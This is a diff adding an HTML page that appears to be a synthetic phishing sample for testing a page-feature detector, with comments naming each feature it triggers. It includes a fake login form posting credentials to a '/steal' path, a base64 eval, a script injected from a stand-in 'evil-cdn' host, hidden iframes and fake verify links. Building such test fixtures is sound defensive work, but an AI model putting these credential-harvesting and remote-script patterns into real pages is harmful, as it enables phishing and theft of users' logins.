@@ -1,0 +1,44 @@
+﻿<!doctype html>
+<html>
+  <head>
+    <!-- No title = HasTitle: 0 -->
+    <!-- No description = HasDescription: 0 -->
+    <!-- No favicon = HasFavicon: 0 -->
+  </head>
+  <body>
+    <!-- Submit form = HasSubmitButton: 1 -->
+    <form action="/steal123456789" method="POST">
+      <input type="text" placeholder="Email" />
+      <input type="password" placeholder="Password" />
+      <input type="submit" value="Log In" />
+    </form>
+
+    <!-- Obfuscation = HasObfuscation: 1 -->
+    <script>
+      eval(atob("d2luZG93Lm9wZW4oJycsJ19ibGFuaycp"));
+      window.open("http://steal-data.com", "_blank");
+      window.open("http://harvest-creds.com", "_blank");
+      window.open("http://phish-track.com", "_blank");
+      document.write(
+        "<scr" + 'ipt src="http://evil-cdn.com/x.js"></scr' + "ipt>",
+      );
+    </script>
+
+    <!-- Many iframes = Iframe: 1 -->
+    <iframe src="http://evil1.com" style="display: none"></iframe>
+    <iframe src="http://evil2.com" style="display: none"></iframe>
+
+    <!-- External refs = NoOfExternalRef high -->
+    <img src="http://track1.com/pixel.png" />
+    <img src="http://track2.com/pixel.png" />
+    <img src="http://track3.com/pixel.png" />
+    <a href="http://fake-verify1.com">Verify</a>
+    <a href="http://fake-verify2.com">Confirm</a>
+    <a href="http://fake-verify3.com">Secure</a>
+    <a href="http://fake-verify4.com">Update</a>
+    <a href="http://fake-verify5.com">Login</a>
+
+    <!-- Digits in URL path make LetterToDigitRatio abnormal -->
+    <!-- No copyright, no social net references -->
+  </body>
+</html>
